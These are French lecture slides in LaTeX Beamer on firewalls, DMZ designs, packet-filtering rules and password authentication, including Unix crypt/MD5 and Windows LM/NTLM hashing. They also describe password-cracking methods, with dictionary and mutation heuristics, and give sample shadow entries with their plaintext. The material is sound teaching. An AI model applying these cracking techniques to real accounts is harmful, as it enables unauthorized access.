+\end{itemize}
+
+\item  {\color{blue} Limitations.} 
+\begin{itemize}
+\item Il n'existe pas d'analyse de contenu (comme de la recherche de virus) du trafic venant d'Internet.
+
+\item Depuis Internet, des connexions directes sont effectuées sur les serveurs internes.
+
+\end{itemize}
+\item  {\color{blue} Applications.} 
+\begin{itemize}
+\item Niveau de sécurité requis : peu élevé.
+\item Peu adapté pour les serveurs qui nécessitent d'être accessibles à un large public (tels que les serveurs web).
+\end{itemize}
+
+\end{itemize}
+\end{small}
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Pare-feu avec zone démilitarizée}
+
+
+\begin{center}
+\includegraphics[width=9cm]{FiguresNAT/pare-feu-et-dmz}
+\end{center}
+
+\end{frame}
+
+
+
+
+
+\begin{frame}
+\frametitle{Pare-feu avec zone démilitarisée (NAT +DMZ)}
+\begin{small}
+\begin{itemize}
+\item {\color{blue} Configuration standard.} 
+\begin{itemize}
+\item Les machines internes ne sont pas autorisés à se connecter à Internet, elles peuvent uniquement communiquer avec le proxy dans la DMZ.
+
+\item Seul le proxy est autorisé à établir une connexion à destination d'Internet.
+
+\item Translation dynamique d'adresses pour toutes les connexions sortantes.
+
+\item Translation statique d'adresses en direction du proxy pour les communications entrantes autorisées (SMTP accès HTTP au serveur de courrier électronique).
+
+\item Filtrage des connexions sortantes pour autoriser uniquement les protocoles nécessaires en direction du proxy (par exemple HTTP, HTTPS, FTP, SMTP, DNS).
+\item Filtrage des connexions entrantes pour interdire les connexions directes vers le pare-feu.
+
+\end{itemize}
+\end{itemize}
+\end{small}
+\end{frame}
+
+\begin{frame}
+\frametitle{Pare-feu avec zone démilitarisée (NAT +DMZ) }
+\begin{small}
+
+\begin{itemize}
+\item  {\color{blue} Limitations.} 
+\begin{itemize}
+\item Le pare-feu est un point critique. Toute vulnérabilité du pare-feu peut être exploitée pour accéder à l'ensemble du réseau interne.
+\item Tous les services p passent au travers du proxy. Si l'un des services est vulnérable aux attaques c'est tout le trafic qui peut être compromis (espionné, bloqué, redirigé, modifié,  \ldots).
+
+\end{itemize}
+\item  {\color{blue} Applications.} 
+\begin{itemize}
+\item Niveau de sécurité requis: moyen.
+\end{itemize}
+
+\end{itemize}
+\end{small}
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Pare-feu avec zone démilitarisée en sandwitch}
+
+\begin{center}
+\includegraphics[width=7.5cm]{FiguresNAT/pare-feux-et-dmz-sandwitch}
+\end{center}
+
+\end{frame}
+
+
+
+
+
+
+
+
+
+
+
+\begin{frame}
+\frametitle{DMZ en sandwitch}
+\begin{small}
+\begin{itemize}
+\item {\color{blue} Configuration standard.} 
+\begin{itemize}
+\item Les machines internes ne sont pas autorisés à se connecter à Internet, elles peuvent uniquement communiquer avec les proxies dans la DMZ et de plus uniquement avec les protocoles respectifs aux proxies.% (par exemple HTTP, HTTPS, FTP, SMTP, DNS).
+
+\item Seuls les proxies sont autorisés à établir des connexions en direction d'Internet.
+
+\item Les fonctions de routages sont désactivées sur les proxies.
+
+\item Translation dynamique d'adresses pour toutes les connexions sortantes.
+
+\item Translation statique d'adresses en direction des proxies pour les protocoles autorisés à entrer.
+
+
+\item Filtrage des connexions sortantes pour autoriser uniquement les protocoles nécessaires en direction des proxies.
+\item Filtrage des connexions entrantes pour interdire toute connexion directe sur le pare-feu.
+
+\end{itemize}
+\item  {\color{blue} Applications.} 
+\begin{itemize}
+\item Niveau de sécurité requis: élevé.
+\end{itemize}
+
+\end{itemize}
+\end{small}
+\end{frame}
+
+\subsection{Proxies}
+
+\begin{frame}
+\frametitle{Proxies : qu'est ce c'est? }
+
+\begin{itemize}
+\item Les proxies (ou serveur relais) sont des relais au niveau applicatif (et non plus au niveau IP ou TCP).
+
+
+\item Les proxies travaillent sous forme de relais de connexion : %les applis source communique avec l'applis destinataires sans avoir à se connecter directement au serveur.
+
+\begin{center}
+\includegraphics[width=9cm]{FiguresNAT/proxy}
+\end{center}
+
+\item Dans les couches de protocoles les proxies se situe:
+
+
+\begin{center}
+\includegraphics[height=4cm]{FiguresNAT/couche-tcpip-proxy}
+\end{center}
+
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Proxies : qu'est ce c'est?}
+\begin{itemize}
+\item Un proxy peut être intégré dans un pare-feu, mais ils sont en général sur des machines séparées.
+\item Pour limiter les risques, on interdit généralement les connexions directes entre machines d'un réseau protégé et internet.
+\item Un proxy peut examiner le contenu des données échanger pour filtrer si le contenu est inapproprié.
+\end{itemize}
+
+Il existe des proxies dédiés pour la plupart des applications réseau: HTTP, FTP, SMTP,  DNS.
+
+\end{frame}
+
+
+\subsection{Filtrage}
+
+
+
+\begin{frame}
+\frametitle{Filtrage : généralité}
+\begin{itemize}
+\item Le filtrage consiste à autoriser ou bloquer du trafic à entrer ou sortir non d'une partie du réseau.
+\item  Le filtrage consiste à applique certaines règles concernants les critères suivants:
+\begin{itemize}
+\item Adresse IP source ou destination.
+\item Protocole (TCP, UDP, ICMP, ...) et port.
+\item Drapeaux et options : TCP SYN, ACK, ICMP.
+\end{itemize}
+
+\item {\color{blue} Exemple :} le filtage d'adresse IP permet de contrer des attaques par spoofing.
+
+\item {\color{blue} Exemple :} le filtage sur les drapeaux SYN et ACK permet de contrer une attaque SYN.
+
+
+\item {\color{blue} Exemple :} le filtage sur ICMP peut autoriser des \texttt{echo-requests} que dans une direction (sortante).
+\end{itemize}
+
+\end{frame}
+
+
+
+
+
+\begin{frame}
+\frametitle{ Filtrage : généralité}
+
+\begin{itemize}
+\item Un pare-feu est configuré via une liste de règle de filtrage.
+
+\item Pour chaque règle on doit spécifier les caractéristiques du paquet (adresses source et/ou destination, ports, drapeaux, \ldots) auxquelles la règles s'applique.
+
+\item Chaque règle contient aussi l'action à prendre avec les paquets sélectionnés par exemple les laisser passer ou les détruire. 
+
+
+\item Pour chaque règle re\c cu le pare-feu parcourt la liste des règles jusqu'à ce qu'il en trouve une qui s'applique. 
+
+\item L'ordre dans lesquels ces règles sont lues est donc \alert{très important!}
+\end{itemize} 
+
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Exemple 1 - règles de filtage : autorisation vers un serveur SMTP} 
+
+%\begin{comment}
+\begin{center}
+\begin{tabular}{|c|c|c|c|c|c||c|}
+\hline
+& source & port & dest & port & protocole & action \\
+\hline
+1 & $\ast$ & $\ast$ &  10.0.0.1 & 25 & TCP & permis \\
+2 & 10.0.0.1 & 25 & $\ast$ & $\ast$ & TCP & permis \\
+\hline
+3 & 10.0.0.1 & $\ast$ & $\ast$ & 25 & TCP & permis \\
+4 & $\ast$ & 25 & 10.0.01 & $\ast$ & TCP & permis \\
+\hline
+5 & $\ast$ & $\ast$ & $\ast$ & $\ast$ & $\ast$ & interdit \\
+\hline
+\end{tabular}
+\end{center}
+%\end{comment}
+
+\only<1>{
+\begin{itemize}
+\item Les règles 1 et 2 laissent passer n'importe quel paquet entre une machine/port quelconque et le serveur SMTP (10.0.0.1, port 25).
+\item Les règles 3 et 4 autorisent le serveur de courrier électronique à se connecter au port 25 de n'importe quel autre serveur pour déposer du courrier.
+\item La derniere règle interdit toute autre type de connexion
+\end{itemize}
+}
+
+\only<2>{
+{\color{blue} Problèmes : pare feu trop permissif}
+\begin{itemize}
+\item Les règles 1 et 2 autorisent la connexion d'un client sur le port 25 du serveur SMTP à se connecter sur n'importe quel machine/port.
+\item Les règles 3 et 4 autorisent un client sur le le port 25 de n'importe quel machine de se connecter sur \alert{n'importe quel port} du serveur SMTP.
+\end{itemize}
+\textit{On peut corriger ces problemes en ajoutant des conditions sur les flags SYN et ACK.}
+}
+\end{frame}
+
+
+
+
+
+
+
+
+
+\begin{frame}
+\frametitle{Exemple 2 - règles de filtage : autorisation vers un serveur SMTP} 
+
+%\begin{comment}
+\begin{center}
+\begin{tabular}{|c|c|c|c|c|c|c||c|}
+\hline
+& source & port & dest & port & protocole & ACK set? & action \\
+\hline
+1 & $\ast$ & $\ast$ &  10.0.0.1 & 25 & TCP &  $\ast$  & permis \\
+2 & 10.0.0.1 & 25 & $\ast$ & $\ast$ & TCP & oui  & permis \\
+\hline
+3 & 10.0.0.1 & $\ast$ & $\ast$ & 25 & TCP &  $\ast$& permis \\
+4 & $\ast$ & 25 & 10.0.01 & $\ast$ & TCP & oui & permis \\
+\hline
+5 & $\ast$ & $\ast$ & $\ast$ & $\ast$ & $\ast$ &  $\ast$ & interdit \\
+\hline
+\end{tabular}
+\end{center}
+%\end{comment}
+
+\only<1>{
+\begin{itemize}
+\item La modification dans la règle 2 interdit l'ouverture de connexion par \textit{10.0.0.1 port 25} vers une autre machine. 
+\item La modification dans la règle 4 interdit l'ouverture d'une connexion d'une machine quelconque (port 25) vers le serveur (port quelconque).
+\end{itemize}
+}
+
+\only<2>{
+{\color{blue} Problème persistant:}
+\begin{itemize}
+\item Si un pirate forge des paquets avec les drapeaux appropriés, le pare-feu les laissera passer.
+\item Le pare feu n'ayant pas de mémoire il ne peut faire la distinction  entre un paquet TCP forgé d'un paquet TCP authentique.
+\item C'est la limite des pare-feu sans mémoire !
+\end{itemize}
+%\textit{On peut corriger ces problemes en ajoutant des conditions sur les flags SYN et ACK.}
+}
+\end{frame}
+
+
+
+
+\begin{frame}
+\frametitle{Exemple 3 -  autorisation vers un serveur SMTP - pare-feu avec mémoire} 
+
+%\begin{comment}
+\begin{center}
+\begin{tabular}{|c|c|c|c|c|c||c|}
+\hline
+& source & port & dest & port & protocole & action \\
+\hline
+1 & $\ast$ & $\ast$ &  10.0.0.1 & 25 & TCP &   permis \\
+\hline
+2 & 10.0.0.1 & $\ast$ & $\ast$ & 25 & TCP &  permis \\
+\hline
+3 & $\ast$ & $\ast$ & $\ast$ & $\ast$ & $\ast$ &  interdit \\
+\hline
+\end{tabular}
+\end{center}
+%\end{comment}
+
+
+\begin{itemize}
+\item Les pare-feu avec mémoire savent qu'un paquet SYN doit être suivit d'un paquet SYN-ACK.
+\item On peut donc spécifier le sens de la connexion (source = client initiateur de la connexion TCP, destinataire = serveur).
+\item La table de filtrage est plus simple !
+\end{itemize}
+
+
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Organisation des règles de filtrage}
+
+\begin{itemize}
+\item Les règles sont parcourues séquentiellement.
+
+\item Si une règle a pour but d'interdire un service est précédée d'une règle l'autorisant cette règle n'a aucun effet.
+
+\item Pare-feu dans une DMZ : 
+\begin{itemize}
+\item Pour les serveurs web  connexion entrantes autorisées,   connexions sortantes refusées.
+\item Les machines internes ne devraient être autorisées à accéder qu'aux proxies.
+\end{itemize}
+
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Règles de filtrage DMZ}
+
+
+\begin{center}
+\begin{tabular}{|c|c|c|c|c|c||c|}
+\hline
+& source & port & dest & port & protocole & action \\
+\hline
+1 & $\ast$ & $\ast$ &  dmz-web & 80 & TCP &   permis \\
+\hline
+2 & interne & $\ast$ &  proxy & 80 & TCP &   permis \\
+3 & interne & $\ast$ &  $\ast$ & $\ast$ & $\ast$ &   interdit \\
+\hline
+4 & $\ast$ & $\ast$ & $\ast$ & $\ast$ & $\ast$ &  interdit \\
+\hline
+\end{tabular}
+\end{center}
+On remarque que la première règle autorise les machines internet à se connecter au dmz-web.
+\pause
+\begin{center}
+\begin{tabular}{|c|c|c|c|c|c||c|}
+\hline
+& source & port & dest & port & protocole & action \\
+\hline
+2 & interne & $\ast$ &  proxy & 80 & TCP &   permis \\
+3 & interne & $\ast$ &  $\ast$ & $\ast$ & $\ast$ &   interdit \\
+\hline
+1 & $\ast$ & $\ast$ &  dmz-web & 80 & TCP &   permis \\
+\hline
+4 & $\ast$ & $\ast$ & $\ast$ & $\ast$ & $\ast$ &  interdit \\
+\hline
+\end{tabular}
+\end{center}
+Ce problème est corrigé en intervertissant l'ordre des règles 1 et 2. 
+
+
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Organisation des règles}
+ Une manière systématique de traiter les configurations complexes consiste à
+\begin{itemize}
+\item définir différents niveaux de sécurité pour chaque zone
+\item créer des règles en ordre décroissant de niveau de sécurité. 
+\end{itemize}
+Pour chaque zone et chaque direction 
+\begin{itemize}
+\item des règles sont créées pour autoriser le trafic désiré.
+\item suivies d'une règle interdisant tout le reste du trafic.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Exemple : table de filtrage pour DMZ}
+\begin{small}
+Ici les zones sont rangées comme suit:
+\begin{itemize}
+\item Sécurité très élevé : zone interne.
+\item Sécurité élevé : zone dmz-proxy  (zone en sandwitch).
+\item Sécurité moyenne : zone  dmz-web (zone en sandwitch).
+\item Sécurité basse : $\ast$ (le reste du réseau).
+\end{itemize}
+\end{small}
+
+\begin{scriptsize}
+\begin{center}
+\begin{tabular}{|c|c|c||c|}
+\hline
+& source  & dest &  action \\
+\hline
+1 & trafic autorisé & interne &  permis \\
+2 & $\ast$ & internet &  interdit \\
+\hline
+3 & interne & trafic autorisé & permis  \\
+4 & interne & $\ast$ & interdit  \\
+\hline
+5 &  trafic autorisé & dmz-proxy &  permis \\
+6 & $\ast$ & dmz-proxy &  interdit \\
+\hline
+7 & dmz-proxy & trafic autorisé & permis  \\
+8 & dmz-proxy &    $\ast$   & interdit  \\
+\hline
+9 &  trafic autorisé & dmz-web &  permis \\
+10 & $\ast$ & dmz-web &  interdit \\
+\hline
+11 & dmz-web & trafic autorisé & permis  \\
+12 & dmz-web &    $\ast$   & interdit  \\
+\hline
+13 & $\ast$ & $\ast$ & interdit \\
+\hline
+\end{tabular}
+\end{center}
+\end{scriptsize}
+
+
+
+
+\end{frame}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  Authentification  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\section{Authentification par mot de passe}
+
+\begin{frame}
+\frametitle{Authentification par mot de passe}
+
+
+\begin{itemize}
+\item L'authentification d'un utilisateur auprès d'un ordinateur repose sur le fait qu'ils possèdent tous deux un secret commun.
+
+\item La méthode d'autentification la plus simple: l'utilisateur présente un mot de passe qui est comparé avec un mot de passe stocké sur la machine.
+
+\item La problème c'est que cette machine possède les mots de passe de tous les utilisateurs faisant de lui une cible idéale.
+\end{itemize}
+
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Authentification par mot de passe}
+\begin{itemize}
+\item La méthode la plus utilisée consiste à ne pas stocker les mots de passe, mais un haché de chacun de ces mots de passe.
+\item Si les mots de passes sont correctement choisis, c'est à dire, suffisament long et aléatoires, un pirates ne peut pas retrouver les mots de passe à partir du fichier contenant les hachés.
+\item En effet pour une fonction de hachage cryptographique en ne connaissant $y=f(x)$ il est très très très très difficile de trouver $x$.
+\item Pour renforcer la sécurité les systèmes d'exploitation stocke les haché dans un fichier nécéssitant des droits privilégiés.
+\end{itemize}
+\end{frame}
+
+\subsection{Authentification Unix/Linux}
+
+
+\begin{frame}
+\frametitle{Authentification Unix - basé sur le DES}
+Le mécanisme d'authentification reposant sur le  DES (Data Encryption Standard) consiste en:
+\begin{itemize}
+\item  On génère le haché d'un mot de passe comme suit
+\begin{itemize} 
+\item la clef de chiffrement est le mot de passe,
+\item On chiffre \alert{chiffre 25 fois} le message $0^{64}$
+\item Le message chiffré est le haché correspondant à la clef.
+\end{itemize}
+
+\end{itemize}
+\bigskip
+
+
+\includegraphics[width=11cm]{25des}
+\end{frame}
+
+\begin{frame}
+\frametitle{Authentification Unix - basé sur le DES}
+\begin{itemize}
+\item Chiffrer 25 fois a pour objectif de ralentir le processus d'authentification et donc de ralentir de possible attaque. 
+
+\item La clef DES est construite
+\begin{itemize}
+\item les 8 premiers caractères du mot de passe (éventuellement bourré avec des 0s) , exemples:
+\begin{center}
+\begin{tabular}{rclcl}
+Mode de passe&=&"ab7YKRekkL" &$\stackrel{\tiny tronquee}{\longrightarrow}$&"ab7YKRek" \\
+Mode de passe&=&"ab7Y" &$\stackrel{\tiny bourree}{\longrightarrow}$ & "ab7Y0000" \\
+\end{tabular}
+\end{center}
+\bigskip
+
+
+\item On extrait ensuite les 7 bits de poids faible de chaque caractère donne
+\end{itemize}
+
+
+\item La taille de la clef est donc
+$$8 \times 7 = 56 \mbox{ bits } = \mbox{  longueur de clef DES }$$ 
+
+\end{itemize}
+
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Authentification Unix - le sel}
+\begin{itemize}
+\item L'algorithme de chiffrement utilise un paramètre de 12 bits appelé \alert{le sel}.
+\item Le sel est fixé  définitivement  par le système  à la création du mot de passe.
+\item Le sel est injecté progressivement durant le chiffrement.
+\item Ce sel permet d'assurer que:
+\begin{itemize}
+\item si le même mot de passe est utilisé par deux utilisateurs, ils aient deux haché différents.
+\item Renforce aussi la robustesse des mots de passe face aux attaques par dictionnaire.
+\end{itemize}
+\end{itemize}
+
+\begin{center}
+\includegraphics[width=8cm]{variante-des-sale}
+\end{center}
+
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Authentification Linux - \texttt{passwd} et \texttt{shadow}}
+
+Concernant plus spécifiquement \alert{Linux}:
+\begin{itemize}
+\item Les hachés des mots de passe étaient stockés dans le fichier \texttt{passwd}.
+\item Ce fichier était  \textit{accessible à tout utilisateur en lecture} car il était utilisé par les commandes telles que \texttt{ls}
+\item Maintenant le fichier \texttt{passwd} ne contient plus les hachés des mots de passe.
+\item Les hachés sont stockés dans le fichier \texttt{shadow} accessible en lecture uniquement avec des droits privilégiés.
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Authentification Linux - \texttt{passwd} et \texttt{shadow}}
+Le fichier \texttt{shadow} contient des lignes de la forme
+ \begin{center}
+username:passwd:last:may:must:warn:expire:disable:reserved
+\end{center}
+où l'on a
+\begin{itemize}
+\item \texttt{username} = nom de l'utilisateur.
+\item \texttt{passwd} = sel et haché du mot de passe.
+\item \texttt{last} = date de la dernière modification du mot de passe.
+\item \texttt{may,must} = nombre de jours avant que le mot de passe puisse/doivent être modifié.
+\item \texttt{warn} = nombre de jours durant lesquels l'utilisateur est averti de l'expiration de son mot de passe.
+\item \texttt{expire} = nombre de jours entre l'expiration de son mot de passe et le blocage du compte.
+\item \texttt{disable} = date du blocage du compte.
+\item \texttt{reserved} = champs réservé pour un usage futur.
+\end{itemize}
+
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Authentification Linux - \texttt{passwd} et \texttt{shadow}}
+
+\begin{itemize}
+\item Si le champs \texttt{passwd} est vide cela signifie que le compte peut être accédé sans mot de passe.
+\item Si \texttt{passwd} vaut $\ast$ le compte est bloqué.
+\item Sinon \texttt{passwd} contient \alert{13 caractères en Base64}, i.e., dans $\{a,\ldots,z,A,\ldots,Z,0,\ldots,9,.,/\}$.
+\begin{itemize}
+\item Les deux premiers caractères contiennent le sel: 6 bit par caractères =12 bits
+\item Les 11 autres caractères représentes le haché: $11 \times 6 =66$ bits suffisent à coder 64 bits de hachés. 
+\end{itemize}
+\item Voici un exemple d'un fichier \texttt{/etc/shadow/} utilisant DES:
+\begin{center}
+\texttt{martin:pHcYIAMtCDtZ2:12801:0:99999:7:::}
+\end{center}
+\item On peut vérifier que ce haché correspond au mot de passe "martinot" avec la commande
+\begin{center}
+\texttt{openssl passwd -crypt -salt pH martinot }
+\end{center}
+\end{itemize}
+
+
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Authentification basée sur MD5}
+\begin{itemize}
+\item Le mécanisme d'authentification MD5 représenté ci-dessous est une alternative à l'obsolète DES (crypt).
+
+\begin{center}
+\includegraphics[width=8cm]{md5-sale}
+\end{center}
+
+\item Ce mécanisme existe depuis 1994, date où PoulHennig Kamp a décidé d'écrire pour FreeBSD une alternative à l'approche DES.
+\item La motivation de  Kamp était de contrer les lois américaines sur l'exportation de matériel cryptographique.
+\item Une des différence est que MD5 est une fonction de hachage et non une fonction de chiffrement et n'était donc pas visé par la loi américaine qui limitait la taille des clefs.
+\item Il n'y a pas de limite sur la taille des mots de passe, les caractères ne sont plus limités et le sel est bien plus long.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Authentification basée sur MD5}
+Dans le fichier \texttt{passwd} 
+\begin{itemize}
+\item Le champs \texttt{passwd} débute avec la chaine \$1\$ indiquant l'utilisation de MD5.
+\item le sel, codé en base64 est concaténé au \$1\$ suivit par un \$.
+\item Le haché suit ce dernier \$, luji aussi en base64.
+\end{itemize}
+
+Par exemple
+\begin{center}
+\texttt{martin:\$1\$gDT4Spf5\$mr76vshidvcT1busoKrre1:11001:0:99999:7:::}
+\end{center}
+
+On peut vérifier que ce haché correspond au mot de passe "martinot" avec la commande
+\begin{center}
+\texttt{openssl passwd -1 -salt gDT4Spf5 martinot }
+\end{center}
+
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Authentification basée sur MD5}
+
+Il existe aujourd'hui d'autres mécanismes d'authentification largement répendus qui ne repose ni sur DES, ni sur MD5.
+
+\begin{center}
+\begin{tabular}{|c|c|}
+\hline
+Identifiant & Méthode \\
+\hline
+1 & MD5 (Linux ,BSD) \\
+2a & Blowfish (OpenBSD) \\
+md5 & Sun MD5 \\
+5 & SHA-256 \\
+6 & SHA-512 \\
+\hline
+\end{tabular}
+\end{center}
+
+\end{frame}
+
+
+\subsection{Authentification Windows}
+
+
+
+\begin{frame}
+\frametitle{Authentification Windows - LMhash}
+\begin{itemize}
+\item Windows 9x utilise un mécanisme d'authentification appelé LAN Manager Hash (LM Hash).
+\item Ce mécanisme est aussi basé sur le DES mais code un mot de passe de fa\c con totalement différent:
+\begin{itemize}
+\item Les minuscules sont converties en majuscules.
+\item Le mot (bourré avec des caractères vides) est alors coupé en deux blocs de 7 caractères.
+\item Chaque bloc est utilisé comme clef pour chiffrer une constante de 8 caractères
+\begin{center}
+\texttt{0x4B,0x47,0x53,0x21,0x40,0x23,0x24,0x25) = "KGS!@\#\$\%"}
+\end{center}
+donnant deux haché que l'on concatène.
+\end{itemize}
+\end{itemize}
+
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Authentification Windows - LMhash}
+
+\begin{center}
+\includegraphics[width=10cm]{LMhash}
+\end{center}
+
+Notons que LMhash n'utilise pas de sel.
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Authentification Windows - NTLMhash}
+
+\begin{itemize}
+\item Windows NT/2000/XP utilise un mécanisme appelé NT LAN Manager Hash (NTLM hash)
+
+\begin{center}
+\includegraphics[width=7cm]{ntlm-md4}
+\end{center}
+\item Ce mécanisme est basé sur MD4 qui génére un haché de 128 bits.
+\item Le mot des passe est géré différemment:
+\begin{itemize}
+\item Prise en compte de la casse.
+\item Le mot n'est pas découpé en deux.
+\item Il peut aller jusqu'à 256 caractères (avec des problèmes de compatibilité s'il dépasse 14 caractères).
+\end{itemize}
+\item Pas d'utilisation de sel.
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+\frametitle{Authentification Windows - NTLMhash}
+\begin{itemize}
+\item Par défaut LM hash est calculé est stocké même sous Windows NT/2000/XP.
+\item Mais il est désactivé sous Windows Vista.
+\item Toutefois la majorité des environnements n'ont plus besoin du LM hash et il peut être alors désactivé:
+\begin{itemize}
+\item Soit en choisissant un mot de passe > 14 caractères.
+\item Soit en modifiant la base de registre 
+\begin{center}
+\texttt{HKEY\_LOCAL\_MACHINE\slash SYSTEM\slash CurrentControlSet\slash Control\slash Lsa}
+Ensuite il faut ajouter une nouvelle clef appelée \texttt{NoLMHash}.
+\end{center}
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+
+
+\subsection{Attaque des mots de passe}
+
+\begin{frame}
+\frametitle{Attaque des mots de passe}
+
+
+Il existe plusieurs techniques pour casse des mots de passe:
+\begin{itemize}
+\item attaque par dictionnaire,
+\item attaque par heuristiques,
+\item attaque par recherche exhaustive.
+\end{itemize}
+
+En général une attaque exhaustive est utilisée pour casser les petits mots de passe, puis une attaque par dictionnaire combiné à des heuristiques et enfin l'attaque exhaustive est utilisé pour les mots de passe non cassé.
+
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Attaque par dictionnaire}
+
+Une attaque par dictionnaire consiste à hacher chaque mot d'un dictionnaire jusqu'à trouver un résultat qui corresponde à la valeur recherchée.
+Les dictionnaires utilisés peuvent être des dictionnaires généraliste ou peuvent être spécialisés sur des sujet particulier (informatique, sport, etc.)
+\begin{itemize}
+\item par exemple dans une entreprise pharmaceutique un dictionnaire sur la biologie ou la chimie devrait être clairement utilisé.
+\item si cette entreprise a des employés d'origine étrangère, un dictionnaire dans leur langue (anglais, espagnol,...) sera aussi recommandé.
+\item Un dictionnaire spécifique à l'entreprise sera aussi à utiliser: avec le nom des différents service, adresses, personnes, etc.
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Attaque par heuristique}
+\begin{itemize}
+\item La majorité des utilisateur savent que les mots de passe issus d'un dictionnaire sont faibles.
+\item Ils appliquent en général une petite mutation au nom commun ou nom propre qu'ils on en tête pour former leur mot de passe.
+\begin{center}
+par exp. voiture1 au lieu de voiture.
+\end{center}
+\item Les attaquants modifient donc leurs dictionnaires selon une heuristique définies comme étant "un humain pourrait le faire".
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Attaque par heuristique - quelques heuristiques}
+\begin{small}
+\begin{itemize}
+\item Mettre en minuscule  (resp. majuscule) chaque mot alphanumérique.
+\item Mettre une majuscule à chaque mot alphanumérique.
+\item Mettre en minuscule et au pluriel  chaque mot composé de lettres uniquement.
+\item Mettre en minuscule (resp. majuscule) et concaténer 1 à chaque mot composé de lettres uniquement.
+\item Concaténer chaque mot de longueur raisonnable composé de lettres uniquement (\textit{fred} donne \textit{fredfred}.)
+\item Mettre en minuscule et inverser chaque mot composé de lettres uniquement.
+\item Mettre en minuscule (resp. majuscule)  et concaténer une lettre ou un chiffre à chaque mot composé de lettres uniquement.
+\item Retirer les voyelles des mots.
+\item Retirer les espaces des mots qui en contiennent.
+\item Etc.
+%\item Mettre une majuscule puis inverser chaque mot composé de lettres uniquement (par exemple \textit{fred} devient \textit{derF}.
+\end{itemize}
+\end{small}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Recherche exhaustive}
+\begin{itemize}
+\item Lorsque les attaques précédentes (dictionnaire et heuristique) ont échouée une recherche exhausitive peut être tentée.
+\item Cela consiste à essayer chaque mot de passe possible.
+\item Comme l'espace des mots de passe est trop grand, on se restreint en général à un sous ensemble de mot de passe par exemple les alphanumérique.
+\item Dans le cas de LM hash une recherche exhaustive peut être réalisée sur l'ensemble des mots de passe alphanumériques en quelques heures seulement.
+%\item Aujourd'hui certains casseur utilise un compromis temps mémoire: cela demande plus de ressource en mémoire mais moins de calcul.
+%\item Par exempl OphCrack casse 96\% des mots de passe LM hash contenant 1 à 14 caractères choisis parmi les suivant:
+%\begin{center}
+%\begin{semiverbatim}
+%012\begin{math}\cdots\end{math}89abc\begin{math}\cdots\end{math} xyzABC\begin{math}\cdots\end{math}XYZ!"\#\%'()*+,-./:;\&<=>?@[]\^{}\_`\{|\}\~{}
+%\end{semiverbatim}
+%\end{center}
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Comment choisir un bon mot de passe}
+\begin{itemize}
+\item Ne pas utiliser son nom d'utilisateur comme mot de passe ou une simple modification de celui la.
+
+
+\item Ne pas utiliser de mots de passe cours: 8 caractères est une taille raisonnable.
+
+
+\item Ne pas utiliser des noms propres: il existe des dictionnaire pour les noms propres.
+
+\item Ne pas utiliser de nombre structuré: numéro de téléphone, plaque d'immatriculation, numéro de sécurité sociale, date d'anniversaire, etc.
+\item Ne pas de séquence du clavier \texttt{azerty, aqzsed,aqwzsx,} etc.
+\item Ne pas utilisé d'acronyme courant OTAN, ADN, etc.
+\item Ne pas utilisé uniquement des lettres: le mot de passe doit être un mélange de lettre, chiffre et caractère spéciaux.
+\item Ne pas utiliser uniquement des lettres minuscule: ce doit être un mélange de lettre majuscule et minuscule.
+\end{itemize}
+
+
+\end{frame}
+
+
+
+\end{document}
